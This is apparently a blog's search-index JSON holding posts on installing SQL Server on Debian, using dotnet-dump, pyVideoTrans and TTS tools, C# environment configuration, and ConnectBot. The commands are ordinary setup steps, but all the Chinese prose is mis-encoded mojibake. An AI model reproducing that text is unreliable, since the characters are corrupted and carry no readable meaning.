#endregion&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"AES","slug":"AES","permalink":"https://banjinmei.github.io/tags/AES/"}],"author":"mu"},{"title":"debian mssql","slug":"debian-mssql","date":"2025-03-16T17:29:20.000Z","updated":"2025-03-16T17:36:43.444Z","comments":true,"path":"2025/03/17/debian-mssql/","permalink":"https://banjinmei.github.io/2025/03/17/debian-mssql/","excerpt":"","text":"Debian ä¸Šè¿è¡Œ SQL Serveråœ¨ Debian ä¸Šå®‰è£… SQL Server 2017+ for Linuxå¾®è½¯å®˜æ–¹æ”¯æŒ SQL Server 2017 &#x2F; 2019 &#x2F; 2022 åœ¨ Linux ä¸Šè¿è¡Œï¼Œä½† Debian æ²¡æœ‰å®˜æ–¹æ”¯æŒï¼Œåªæ”¯æŒ Ubuntu å’Œ Red Hat ç³»åˆ—ã€‚ å¯ä»¥ç”¨ Debian å…¼å®¹çš„æ–¹å¼ å®‰è£… SQL Server 2017+ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š 1. æ£€æŸ¥ç³»ç»Ÿç‰ˆæœ¬ç¡®ä¿çš„ Debian ç‰ˆæœ¬æ˜¯ Debian 10+ï¼ˆè¾ƒæ–°çš„ç‰ˆæœ¬å…¼å®¹æ€§æ›´å¥½ï¼‰ã€‚ 1cat /etc/os-release å¦‚æœæ˜¯ Debian 9 æˆ–æ›´æ—©ï¼Œå»ºè®®å‡çº§åˆ° Debian 10+ï¼Œå¦åˆ™å¯èƒ½ä¼šé‡åˆ°ä¾èµ–é—®é¢˜ã€‚ 2. æ·»åŠ  Microsoft SQL Server ä»“åº“ï¼ˆ1ï¼‰å¯¼å…¥ Microsoft GPG å¯†é’¥123sudo apt updatesudo apt install curlcurl -fsSL https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - ï¼ˆ2ï¼‰æ·»åŠ  SQL Server è½¯ä»¶æº1sudo curl -fsSL https://packages.microsoft.com/config/debian/10/mssql-server-2019.list | sudo tee /etc/apt/sources.list.d/mssql-server.list âš  æ³¨æ„ï¼šå³ä½¿å®‰è£…çš„æ˜¯ SQL Server 2017ï¼Œä¹Ÿæ¨èä½¿ç”¨ 2019 çš„ä»“åº“ï¼Œå› ä¸º SQL Server 2017 ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªä»“åº“å®‰è£…ã€‚ 3. å®‰è£… SQL Server12sudo apt updatesudo apt install -y mssql-server å®‰è£…å®Œæˆåï¼ŒSQL Server è¿˜æ²¡æœ‰å®Œå…¨é…ç½®ï¼Œéœ€è¦è¿è¡Œåˆå§‹åŒ–å‘½ä»¤ã€‚ 4. é…ç½® SQL Server1sudo /opt/mssql/bin/mssql-conf setup è¿™ä¸ªå‘½ä»¤ä¼šè®©é€‰æ‹©ï¼š é€‰æ‹© SQL Server ç‰ˆæœ¬ï¼ˆé€‰æ‹© Developer æˆ– Express ç‰ˆï¼‰è®¾ç½® SAï¼ˆè¶…çº§ç®¡ç†å‘˜ï¼‰å¯†ç ï¼ˆå¯†ç è¦æ±‚ï¼š8+å­—ç¬¦ï¼Œå¤§å°å†™+æ•°å­—+ç‰¹æ®Šå­—ç¬¦ï¼‰æ˜¯å¦åŒæ„è®¸å¯è¯åè®®ï¼ˆè¾“å…¥ YESï¼‰å®‰è£…å®Œæˆåï¼ŒSQL Server 2017+ å°±ä¼šåœ¨ Debian ä¸Šè¿è¡Œã€‚ 5. å¯åŠ¨ SQL Server å¹¶æ£€æŸ¥çŠ¶æ€ï¼ˆ1ï¼‰å¯åŠ¨ SQL Server12sudo systemctl start mssql-server ï¼ˆ2ï¼‰æŸ¥çœ‹ SQL Server è¿è¡ŒçŠ¶æ€1sudo systemctl status mssql-server å¦‚æœçœ‹åˆ° active (running)ï¼Œè¯´æ˜ SQL Server å·²ç»è¿è¡Œã€‚ ï¼ˆ3ï¼‰å¼€æœºè‡ªåŠ¨å¯åŠ¨ SQL Server1sudo systemctl enable mssql-server 6. å®‰è£… SQL Server å‘½ä»¤è¡Œå·¥å…·ï¼ˆå¯é€‰ï¼‰è¦ä»ç»ˆç«¯ç®¡ç†æ•°æ®åº“ï¼Œéœ€è¦å®‰è£… sqlcmd å’Œ bcp å·¥å…·ã€‚ ï¼ˆ1ï¼‰æ·»åŠ  Microsoft å­˜å‚¨åº“1curl -fsSL https://packages.microsoft.com/config/debian/10/prod.list | sudo tee /etc/apt/sources.list.d/mssql-tools.list ï¼ˆ2ï¼‰å®‰è£… SQL Server å‘½ä»¤è¡Œå·¥å…·12sudo apt updatesudo apt install -y mssql-tools unixodbc-dev ï¼ˆ3ï¼‰é…ç½® PATH ç¯å¢ƒå˜é‡12echo &#x27;export PATH=&quot;$PATH:/opt/mssql-tools/bin&quot;&#x27; &gt;&gt; ~/.bashrcsource ~/.bashrc è¿™æ ·ï¼Œå°±å¯ä»¥ç›´æ¥è¿è¡Œ sqlcmd äº†ã€‚ 7. è¿æ¥ SQL Serverä½¿ç”¨ sqlcmd è¿æ¥ SQL Serverï¼š 1sqlcmd -S localhost -U SA -P &#x27;çš„å¯†ç &#x27; å¦‚æœè¿æ¥æˆåŠŸï¼Œä¼šçœ‹åˆ° 1&gt; æç¤ºç¬¦ï¼Œè¡¨ç¤ºå¯ä»¥æ‰§è¡Œ SQL è¯­å¥äº†ã€‚ä¾‹å¦‚ï¼š 12SELECT @@VERSION;GO å®ƒä¼šæ˜¾ç¤º SQL Server ç‰ˆæœ¬ä¿¡æ¯ã€‚ 8. å¼€æ”¾é˜²ç«å¢™ç«¯å£ï¼ˆå¦‚æœéœ€è¦è¿œç¨‹è®¿é—®ï¼‰SQL Server é»˜è®¤ä½¿ç”¨ 1433 ç«¯å£ï¼Œå¦‚æœéœ€è¦è¿œç¨‹è®¿é—®ï¼š 1sudo ufw allow 1433/tcp ç„¶ååœ¨ å…¶ä»–ç”µè„‘ é€šè¿‡ SQL Server Management Studio (SSMS) æˆ– sqlcmd è¿æ¥ï¼š 1sqlcmd -S çš„æœåŠ¡å™¨IP -U SA -P &#x27;çš„å¯†ç &#x27; 9. TESTï¼ˆå¯é€‰ï¼‰å¦‚æœéœ€è¦åˆ›å»ºæ•°æ®åº“ï¼š 1234CREATE DATABASE MyDatabase;GOUSE MyDatabase;GO æ­¥éª¤ å‘½ä»¤æ·»åŠ  Microsoft ä»“åº“ &#96;curl -fsSL https://packages.microsoft.com/config/debian/10/mssql-server-2019.listå®‰è£… SQL Server sudo apt update &amp;&amp; sudo apt install -y mssql-serveré…ç½® SQL Server sudo &#x2F;opt&#x2F;mssql&#x2F;bin&#x2F;mssql-conf setupå¯åŠ¨ SQL Server sudo systemctl start mssql-serverå®‰è£… SQL å‘½ä»¤è¡Œå·¥å…· sudo apt install -y mssql-tools unixodbc-devè¿æ¥ SQL Server sqlcmd -S localhost -U SA -P â€˜çš„å¯†ç â€™è¿™æ ·ï¼Œçš„ SQL Server 2017+ å°±èƒ½åœ¨ Debian ä¸Šæ­£å¸¸è¿è¡Œäº†ï¼ğŸš€ ç›´è£…æ€»ç»“ç›´è£… SQL Server 2017+ 1234567sudo apt updatesudo apt install curlcurl -fsSL https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -curl -fsSL https://packages.microsoft.com/config/debian/10/mssql-server-2019.list | sudo tee /etc/apt/sources.list.d/mssql-server.listsudo apt updatesudo apt install -y mssql-server Dockerç”¨ Docker è¿è¡Œ SQL Server 2017 Expressï¼ˆä»…é€‚ç”¨äº .NET Coreï¼‰å¦‚æœçš„ .NET é¡¹ç›®å¯ä»¥å‡çº§åˆ° .NET Coreï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥åœ¨ Debian ä¸Šè¿è¡Œ SQL Server 2017 Express for Linuxã€‚ 123docker run -e &#x27;ACCEPT_EULA=Y&#x27; -e &#x27;SA_PASSWORD=YourPassword!&#x27; \\ -p 1433:1433 --name sqlserver \\ -d mcr.microsoft.com/mssql/server:2017-latest","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Debian","slug":"Debian","permalink":"https://banjinmei.github.io/tags/Debian/"},{"name":"MSSQL","slug":"MSSQL","permalink":"https://banjinmei.github.io/tags/MSSQL/"}],"author":"mu"},{"title":".NET dump","slug":"NET-dump","date":"2025-03-16T16:43:26.000Z","updated":"2025-03-16T17:22:03.758Z","comments":true,"path":"2025/03/17/NET-dump/","permalink":"https://banjinmei.github.io/2025/03/17/NET-dump/","excerpt":"","text":"dotnet-dumpdotnet-dump æ˜¯ä¸€ä¸ªç”¨äº æ”¶é›†å’Œåˆ†æ .NET è¿›ç¨‹å†…å­˜è½¬å‚¨ çš„å·¥å…·ï¼Œé€‚ç”¨äº æ’æŸ¥å†…å­˜å ç”¨è¿‡é«˜ã€GC é—®é¢˜ã€å†…å­˜æ³„æ¼ ç­‰é—®é¢˜ã€‚ 1. å®‰è£… dotnet-dumpå¦‚æœçš„ç³»ç»Ÿæ²¡æœ‰ dotnet-dumpï¼Œå¯ä»¥å®‰è£…ï¼š 1dotnet tool install --global dotnet-dump å¦‚æœå·²ç»å®‰è£…ï¼Œä½†å‘½ä»¤æ‰¾ä¸åˆ°ï¼Œå¯èƒ½éœ€è¦ æ›´æ–°ç¯å¢ƒå˜é‡ï¼š 1export PATH=&quot;$HOME/.dotnet/tools:$PATH&quot; ç„¶åæ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸï¼š 1dotnet-dump --help 2. æ”¶é›† dotnet è¿›ç¨‹çš„å†…å­˜è½¬å‚¨æ­¥éª¤ 1ï¼šæ‰¾åˆ° dotnet è¿›ç¨‹ ID12ps aux | grep dotnet ä¾‹å¦‚ï¼š root 134609 106 6.0 276010852 242112 pts&#x2F;3 Sl 10:10 0:04 dotnet &#x2F;root&#x2F;nets4&#x2F;IM.dllè¿™é‡Œçš„ 134609 å°±æ˜¯ dotnet è¿›ç¨‹çš„ PIDã€‚ æ­¥éª¤ 2ï¼šæ”¶é›†è½¬å‚¨1dotnet-dump collect -p 134609 å®ƒä¼šç”Ÿæˆä¸€ä¸ª .dmp æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š 12Writing full dump to file /root/core_134609.dmp ...Dump successfully written 3. åˆ†æ dotnet è½¬å‚¨æ­¥éª¤ 1ï¼šè¿›å…¥äº¤äº’æ¨¡å¼ 1dotnet-dump analyze /root/core_134609.dmp ä¼šè¿›å…¥ dotnet-dump äº¤äº’æ¨¡å¼ï¼Œç±»ä¼¼è¿™æ ·ï¼š dotnet-dump analyze &#x2F;root&#x2F;core_134609.dmpLoading core dumpâ€¦(133920) loaded core dump from â€œ&#x2F;root&#x2F;core_134609.dmpâ€Type â€˜helpâ€™ for more information. æ­¥éª¤ 2ï¼šåˆ†æå†…å­˜å ç”¨â‘  æŸ¥çœ‹æ‰˜ç®¡å †å†…å­˜ 1dumpheap -stat ä¼šåˆ—å‡ºæ‰€æœ‰ .NET å¯¹è±¡ åŠå…¶å†…å­˜å ç”¨ï¼š vbnet MT Count TotalSize Class Name00007ffb98b33800 10 2048 System.String00007ffb98b3f8f8 5 1024 System.Byte[]â€¦å¦‚æœ TotalSize éå¸¸å¤§ï¼Œå¯èƒ½æ˜¯ å¤§å¯¹è±¡ (LOH) æˆ– GC æ²¡æœ‰åŠæ—¶å›æ”¶ å¯¼è‡´çš„ã€‚ â‘¡ æŸ¥æ‰¾å ç”¨æœ€å¤šå†…å­˜çš„å¯¹è±¡ 1dumpheap -stat | sort -nr -k 3 | head -20 æ‰¾å‡º å ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡ã€‚ â‘¢ æŸ¥çœ‹å…·ä½“å®ä¾‹å‡è®¾ System.Byte[] å ç”¨å¾ˆå¤šï¼Œå¯ä»¥æŸ¥çœ‹å®ä¾‹ï¼š 12dumpheap -type System.Byte[] ä¼šåˆ—å‡ºå®ä¾‹çš„åœ°å€ï¼Œä¾‹å¦‚ï¼š css Address MT Size00007FFBE80F01B0 00007FFBE827D6E8 10240000007FFBE80F12C0 00007FFBE827D6E8 512000ç„¶åå¯ä»¥æŸ¥çœ‹æŸä¸ªå®ä¾‹çš„è¯¦ç»†å†…å®¹ï¼š 1do 00007FFBE80F01B0 â‘£ æŸ¥çœ‹çº¿ç¨‹ä¿¡æ¯å¦‚æœçš„ .NET è¿›ç¨‹å ç”¨ å¤§é‡ CPU æˆ– GC å¡ä½ï¼Œå¯ä»¥æŸ¥çœ‹çº¿ç¨‹ï¼š 1threads ç„¶åå¯ä»¥é€‰ä¸€ä¸ªçº¿ç¨‹ IDï¼Œä¾‹å¦‚ï¼š 1clrstack -i 10 çœ‹çœ‹å½“å‰çº¿ç¨‹åœ¨æ‰§è¡Œä»€ä¹ˆã€‚ â‘¤ æŸ¥çœ‹ GC ä¿¡æ¯ 1gcroot 00007FFBE80F01B0 å¯ä»¥æ‰¾å‡ºå“ªäº›å¯¹è±¡å¼•ç”¨äº† 00007FFBE80F01B0ï¼Œå¸®åŠ©å®šä½ å†…å­˜æ³„æ¼ã€‚ 4. ç»“æŸåˆ†æåˆ†æå®Œåï¼Œå¯ä»¥è¾“å…¥ï¼š 1exit é€€å‡º dotnet-dump äº¤äº’æ¨¡å¼ã€‚ 5. ç»“åˆ dotnet-trace è¿›è¡Œå®æ—¶åˆ†æå¦‚æœæ€€ç–‘ .NET è¿›ç¨‹åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å ç”¨å¤§é‡å†…å­˜ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ï¼š 1dotnet-trace collect -p 134609 --providers Microsoft-Windows-DotNETRuntimeç„¶åç”¨ perfview æˆ– dotnet-trace è¿›è¡Œåˆ†æã€‚ æ€»ç»“å®‰è£… dotnet-dumpï¼š 1dotnet tool install --global dotnet-dump æ”¶é›† dotnet è¿›ç¨‹çš„å†…å­˜è½¬å‚¨ï¼š 1dotnet-dump collect -p &lt;PID&gt; åˆ†æè½¬å‚¨ï¼š 1dotnet-dump analyze /path/to/dump ä½¿ç”¨ dumpheapã€gcrootã€clrstack ç­‰å‘½ä»¤æ‰¾å‡ºé—®é¢˜å¦‚æœæ˜¯ GC ç›¸å…³é—®é¢˜ï¼Œå¯ä»¥å°è¯• Workstation GC (DOTNET_GCServer&#x3D;0) å…³é”®1dotnet-dump collect -p &lt;PID&gt; å°† æ›¿æ¢ä¸ºå®é™…è¿›ç¨‹çš„ ID","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".NET","slug":"NET","permalink":"https://banjinmei.github.io/tags/NET/"}],"author":"mu"},{"title":"AI TTS pyVideoTrans","slug":"AI-TTS-pyVideoTrans","date":"2025-03-16T13:53:40.000Z","updated":"2025-03-16T14:27:36.166Z","comments":true,"path":"2025/03/16/AI-TTS-pyVideoTrans/","permalink":"https://banjinmei.github.io/2025/03/16/AI-TTS-pyVideoTrans/","excerpt":"","text":"pyVideoTranså¼€æºè§†é¢‘ç¿»è¯‘Translate the video from one language to another and add dubbing. å°†è§†é¢‘ä»ä¸€ç§è¯­è¨€ç¿»è¯‘ä¸ºå¦ä¸€ç§è¯­è¨€ï¼ŒåŒæ—¶æ”¯æŒè¯­éŸ³è¯†åˆ«è½¬å½•ã€è¯­éŸ³åˆæˆã€å­—å¹•ç¿»è¯‘ã€‚ ç™¾åº¦ç½‘ç›˜ä¸‹è½½åœ°å€: https://pan.baidu.com/s/1AFcVVL9n5TfpgiQPfOMPiw?pwd=817iGitHubåœ°å€: https://github.com/jianchang512/pyvideotrans/releases/download/v3.64/win-PatchUpdate-3.65.7z 1.é€‰æ‹©éœ€è¦è½¬è¯‘çš„è§†é¢‘2.é€‰æ‹©ç¿»è¯‘æ¸ é“é€‰æ‹©å…è´¹çš„ç¿»è¯‘æ¸ é“å³å¯ ä¹Ÿå¯ä»¥é€‰æ‹©éƒ¨ç½²å¥½çš„æ¨¡å‹ å¦‚ ï¼šæœ¬åœ°qwen:7bæ¨¡å‹ æˆ– ds 3.é€‰æ‹©é…éŸ³æ¸ é“å¦‚ å°åº¦è¯­çŸ­è§†é¢‘è½¬è¯‘ åˆ™é€‰æ‹©å°åº¦è¯­ è¿™é‡Œé€‰æ‹© Elevenlabs.ioçš„APIé€‰æ‹©åè¦åœ¨é¡¶éƒ¨èœå•è¾“å…¥APIçš„key TTSè®¾ç½® -&gt; ElevenLabs.ioè¾“å…¥ keyæ³¨å†Œæœ‰é€å…è´¹çš„é¢åº¦https://elevenlabs.io/å¹´ä»˜ä¾¿å®œ2ä¸¤ä¸ªæœˆ é€‰æ‹©éŸ³è‰²ï¼Œå¯ä»¥è¯•å¬é€‰æ‹©åµŒå…¥å­—å¹• è½¯å­—å¹•ï¼ˆåŒè¯­ï¼‰ä¿ç•™èƒŒæ™¯éŸ³ 4.é€‰æ‹© è¯­éŸ³è¯†åˆ«è¯­éŸ³è¯†åˆ«æ¨¡å‹ä» tiny åˆ° base -&gt;small -&gt; medium -&gt; large-v3 æ¨¡å‹ï¼Œè¯†åˆ«æ•ˆæœè¶Šæ¥è¶Šå¥½ï¼Œä½†æ¨¡å‹ä½“ç§¯è¶Šæ¥è¶Šå¤§ï¼Œè¯†åˆ«é€Ÿåº¦è¶Šæ¥è¶Šæ…¢ï¼Œéœ€è¦æ›´å¤šCPU&#x2F;å†…å­˜&#x2F;GPUèµ„æºã€‚é»˜è®¤ä½¿ç”¨tinyæ¨¡å‹ï¼Œå¦‚æœæƒ³è¦æ›´å¥½çš„æ•ˆæœï¼Œè¯·ä½¿ç”¨æ›´å¤§æ¨¡å‹.en åç¼€æ¨¡å‹å’Œ distil å¼€å¤´çš„æ¨¡å‹åªç”¨äºè¯†åˆ«è‹±æ–‡å‘éŸ³è§†é¢‘ æ ¹æ®éœ€è¦é€‰æ‹© 5.ç‚¹å‡» å¼€å§‹ å¤„ç†è§†é¢‘6.è°ƒæ•´ éŸ³è‰²æ ¹æ®åŸè§†é¢‘ç”·å¥³å£°è°ƒæ•´éŸ³è‰² ï¼Œç”·å£°é€‰æ‹©ç”·çš„éŸ³è‰² éŸ³è‰² 7.ç»§ç»­å¤„ç† ç­‰å¾…å¤„ç†å®Œæˆå®Œæˆåå³å¯å¾—åˆ° è½¬æ¢åçš„è§†é¢‘ å¼€æºTTSGPT-SoVITSæ˜¯ä¸€æ¬¾å‡ºè‰²çš„å¤šè¯­è¨€æ–‡æœ¬åˆ°è¯­éŸ³ï¼ˆTTSï¼‰å¼€æºé¡¹ç›®ï¼Œæ”¯æŒä¸­ã€è‹±ã€æ—¥ã€éŸ©ç­‰å¤šç§è¯­è¨€ï¼Œä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼šé›¶æ ·æœ¬æ–‡æœ¬åˆ°è¯­éŸ³ï¼ˆTTSï¼‰ï¼š ä»…éœ€5ç§’çš„å£°éŸ³æ ·æœ¬ï¼Œå³å¯å¿«é€Ÿç”Ÿæˆè¯­éŸ³ã€‚å°‘æ ·æœ¬ TTSï¼š åªéœ€1åˆ†é’Ÿçš„è®­ç»ƒæ•°æ®å³å¯å¯¹æ¨¡å‹è¿›è¡Œå¾®è°ƒï¼Œä»è€Œæå‡éŸ³è‰²ç›¸ä¼¼åº¦å’Œè‡ªç„¶åº¦ã€‚è·¨è¯­è¨€æ”¯æŒï¼š æ”¯æŒä¸è®­ç»ƒæ•°æ®é›†ä¸åŒè¯­è¨€çš„åˆæˆï¼Œç›®å‰æ”¯æŒè‹±è¯­ã€æ—¥è¯­ã€éŸ©è¯­ã€ç²¤è¯­å’Œä¸­æ–‡ã€‚ ChatTTS-uié¡¹ç›®åœ°å€ https://github.com/jianchang512/chattts-uiå¯åŠ¨ ChatTTS-uié¡¹ç›®åï¼Œå°†httpåœ°å€ï¼Œé»˜è®¤http://127.0.0.1:9966 å¡«å†™åˆ°è§†é¢‘ç¿»è¯‘é…éŸ³è½¯ä»¶â€“èœå•-è®¾ç½®-ChatTTSåœ°å€ä¸­ CosyVoiceå¼€æºåœ°å€ https://github.com/FunAudioLLM/CosyVoice CosyVoice-apiå¼€æºåœ°å€ https://github.com/jianchang512/cosyvoice-api æ”¯æŒ ä¸­æ–‡ã€è‹±æ–‡ã€æ—¥è¯­ã€éŸ©è¯­ã€ç²¤è¯­ï¼Œå¯¹åº”è¯­è¨€ä»£ç åˆ†åˆ«æ˜¯ zh|en|jp|ko|yue kokoro TTSæ”¯æŒä¸­æ–‡ã€è‹±æ–‡ã€æ—¥è¯­ã€æ³•è¯­ã€æ„å¤§åˆ©è¯­ã€è‘¡è„ç‰™ã€è¥¿ç­ç‰™ã€å°åœ°è¯­å…±8ç§è¯­è¨€é…éŸ³é¡¹ç›®åœ°å€ https://github.com/jianchang512/kokoro-uiapi F5-TTS-apiè¯¥é¡¹ç›®æºç åœ°å€ https://github.com/jianchang512/f5-tts-api è¿™æ˜¯ç”¨äº F5-TTS é¡¹ç›®çš„apiå’ŒwebuiF5-TTS æ˜¯ä¸€æ¬¾å…ˆè¿›çš„æ–‡æœ¬è½¬è¯­éŸ³ç³»ç»Ÿï¼Œå®ƒä½¿ç”¨æ·±åº¦å­¦ä¹ æŠ€æœ¯ç”Ÿæˆé€¼çœŸã€é«˜è´¨é‡çš„äººå£°ã€‚åªéœ€çŸ­çŸ­10ç§’çš„éŸ³é¢‘æ ·æœ¬ï¼Œå°±èƒ½å…‹éš†å‡ºä½ çš„å£°éŸ³ã€‚F5-TTS èƒ½å¤Ÿå‡†ç¡®å†ç°è¯­éŸ³ï¼Œå¹¶èµ‹äºˆå…¶ä¸°å¯Œçš„æ„Ÿæƒ…è‰²å½©ã€‚ ElevenLabså®˜ç½‘ã€‚https://elevenlabs.io/æœ‰å…è´¹é¢åº¦","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://banjinmei.github.io/tags/AI/"},{"name":"TTS","slug":"TTS","permalink":"https://banjinmei.github.io/tags/TTS/"},{"name":"Video","slug":"Video","permalink":"https://banjinmei.github.io/tags/Video/"}],"author":"mu"},{"title":".NET Runtime Param","slug":"NET-Runtime-Param","date":"2025-03-15T18:40:38.000Z","updated":"2025-03-16T13:50:03.303Z","comments":true,"path":"2025/03/16/NET-Runtime-Param/","permalink":"https://banjinmei.github.io/2025/03/16/NET-Runtime-Param/","excerpt":"","text":"åœ¨C#ä¸­ï¼Œæ ¹æ®ä¸åŒçš„ç¯å¢ƒï¼ˆä¾‹å¦‚æµ‹è¯•ç¯å¢ƒã€å‘å¸ƒç¯å¢ƒï¼‰æ”¹å˜ç¨‹åºè¡Œä¸ºæ˜¯ä¸€ç§å¸¸è§çš„éœ€æ±‚ã€‚é€šå¸¸ï¼Œå¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶ã€ç¯å¢ƒå˜é‡æˆ–è€…é¢„ç¼–è¯‘æŒ‡ä»¤æ¥å®ç°è¿™ä¸€éœ€æ±‚ã€‚ 1. ä½¿ç”¨é¢„ç¼–è¯‘æŒ‡ä»¤é¢„ç¼–è¯‘æŒ‡ä»¤ï¼ˆå¦‚#if, #defineï¼‰å…è®¸ä½ åœ¨ç¼–è¯‘æ—¶æ ¹æ®ä¸åŒçš„æ¡ä»¶ç¼–è¯‘ä¸åŒçš„ä»£ç å—ã€‚è¿™ç§æ–¹æ³•é€šå¸¸ç”¨äºç¼–è¯‘æ—¶ç¡®å®šç¯å¢ƒã€‚ é¦–å…ˆï¼Œåœ¨é¡¹ç›®å±æ€§ä¸­å®šä¹‰å®ï¼š æ‰“å¼€é¡¹ç›®å±æ€§ï¼ˆå³é”®ç‚¹å‡»é¡¹ç›® -&gt; å±æ€§ï¼‰ã€‚ è½¬åˆ°â€œæ„å»ºâ€é€‰é¡¹å¡ã€‚ åœ¨â€œæ¡ä»¶ç¼–è¯‘ç¬¦å·â€ä¸­è¾“å…¥å®åç§°ï¼Œä¾‹å¦‚TESTæˆ–RELEASEã€‚ ç„¶åï¼Œåœ¨ä»£ç ä¸­ä½¿ç”¨è¿™äº›å®ï¼š 12345678910111213#define TEST class Program&#123; static void Main(string[] args) &#123; #if TEST Console.WriteLine(&quot;This is the test environment.&quot;); #else Console.WriteLine(&quot;This is the release environment.&quot;); #endif &#125;&#125; 2. ä½¿ç”¨é…ç½®æ–‡ä»¶å¦ä¸€ç§å¸¸è§çš„æ–¹æ³•æ˜¯ä½¿ç”¨é…ç½®æ–‡ä»¶ï¼ˆå¦‚appsettings.jsonæˆ–app.configï¼‰ï¼Œå¹¶é€šè¿‡ä»£ç è¯»å–è¿™äº›é…ç½®æ¥å†³å®šç¨‹åºçš„è¡Œä¸ºã€‚è¿™ç§æ–¹æ³•æ›´é€‚åˆäºè¿è¡Œæ—¶çš„ç¯å¢ƒåˆ‡æ¢ã€‚ é¦–å…ˆï¼Œåœ¨appsettings.jsonä¸­æ·»åŠ ç¯å¢ƒé…ç½®ï¼š 123&#123; &quot;Environment&quot;: &quot;Test&quot;&#125; ç„¶åï¼Œåœ¨C#ä»£ç ä¸­è¯»å–è¿™äº›é…ç½®ï¼š 1234567891011121314151617using Microsoft.Extensions.Configuration;using System;using System.IO; class Program&#123; static void Main(string[] args) &#123; var builder = new ConfigurationBuilder() .SetBasePath(Directory.GetCurrentDirectory()) .AddJsonFile(&quot;appsettings.json&quot;, optional: true, reloadOnChange: true); IConfigurationRoot configuration = builder.Build(); var environment = configuration[&quot;Environment&quot;]; Console.WriteLine($&quot;Environment: &#123;environment&#125;&quot;); &#125;&#125; 3. ä½¿ç”¨ç¯å¢ƒå˜é‡ç¯å¢ƒå˜é‡ä¹Ÿå¯ä»¥ç”¨æ¥åŒºåˆ†ä¸åŒçš„è¿è¡Œç¯å¢ƒã€‚ä½ å¯ä»¥åœ¨å‘å¸ƒåº”ç”¨æ—¶è®¾ç½®ä¸åŒçš„ç¯å¢ƒå˜é‡ã€‚ åœ¨C#ä¸­è¯»å–ç¯å¢ƒå˜é‡ï¼š 12345678910using System; class Program&#123; static void Main(string[] args) &#123; string environment = Environment.GetEnvironmentVariable(&quot;MY_APP_ENV&quot;); // MY_APP_ENVæ˜¯ç¯å¢ƒå˜é‡åï¼Œä¾‹å¦‚&quot;Test&quot;æˆ–&quot;Release&quot; Console.WriteLine($&quot;Environment: &#123;environment&#125;&quot;); &#125;&#125; æ€»ç»“é¢„ç¼–è¯‘æŒ‡ä»¤é€‚åˆäºç¼–è¯‘æ—¶ç¡®å®šç¯å¢ƒã€‚ é…ç½®æ–‡ä»¶é€‚åˆäºè¿è¡Œæ—¶ç¡®å®šç¯å¢ƒï¼Œå¹¶ä¸”å¯ä»¥æ›´çµæ´»åœ°ç®¡ç†ä¸åŒç¯å¢ƒçš„é…ç½®ã€‚ ç¯å¢ƒå˜é‡æä¾›äº†ä¸€ç§çµæ´»çš„æ–¹å¼æ¥åˆ‡æ¢åº”ç”¨è¿è¡Œçš„ç¯å¢ƒï¼Œæ— éœ€é‡æ–°ç¼–è¯‘ä»£ç ã€‚ é€‰æ‹©å“ªç§æ–¹æ³•å–å†³äºä½ çš„å…·ä½“éœ€æ±‚å’Œåå¥½ã€‚é€šå¸¸ï¼Œå¯¹äºç”Ÿäº§ç¯å¢ƒçš„é…ç½®ï¼Œä½¿ç”¨é…ç½®æ–‡ä»¶æˆ–ç¯å¢ƒå˜é‡æ˜¯æ¯”è¾ƒå¸¸è§çš„åšæ³•ï¼Œå› ä¸ºå®ƒä»¬æä¾›äº†æ›´å¥½çš„çµæ´»æ€§å’Œæ˜“äºç®¡ç†æ€§ã€‚è€Œå¯¹äºå¼€å‘å’Œæµ‹è¯•é˜¶æ®µï¼Œé¢„ç¼–è¯‘æŒ‡ä»¤å¯èƒ½æ›´ä¸ºç›´æ¥å’Œç®€å•ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".NET","slug":"NET","permalink":"https://banjinmei.github.io/tags/NET/"}],"author":"mu"},{"title":"Mobile SSH","slug":"Mobile-SSH","date":"2025-03-15T18:38:41.000Z","updated":"2025-03-15T18:39:05.014Z","comments":true,"path":"2025/03/16/Mobile-SSH/","permalink":"https://banjinmei.github.io/2025/03/16/Mobile-SSH/","excerpt":"","text":"ConnectBotConnectBotæ˜¯ä¸€æ¬¾å¼€æºçš„SSHå®¢æˆ·ç«¯ï¼Œä»¥å…¶ç®€æ´å®ç”¨è€Œé—»åã€‚è™½ç„¶ç•Œé¢ç›¸å¯¹ç®€å•ï¼Œä½†åŠŸèƒ½å´ä¸å¤±å¼ºå¤§ã€‚ConnectBotæ”¯æŒå¤šç§åŠ å¯†æ–¹å¼ï¼Œèƒ½å¤ŸåŒæ—¶ç®¡ç†å¤šä¸ªSSHä¼šè¯ï¼Œæ˜¯ä¸€æ¬¾ç¨³å®šå¯é çš„å·¥å…·ã€‚ ç®€æ´çš„ç”¨æˆ·ç•Œé¢ï¼Œæ˜“äºä¸Šæ‰‹ï¼› å¼ºå¤§çš„åŠ å¯†æ”¯æŒï¼Œä¿è¯è¿æ¥å®‰å…¨ï¼› å¼€æºé¡¹ç›®ï¼Œç¤¾åŒºæ”¯æŒè‰¯å¥½ã€‚ https://github.com/connectbot/connectbot 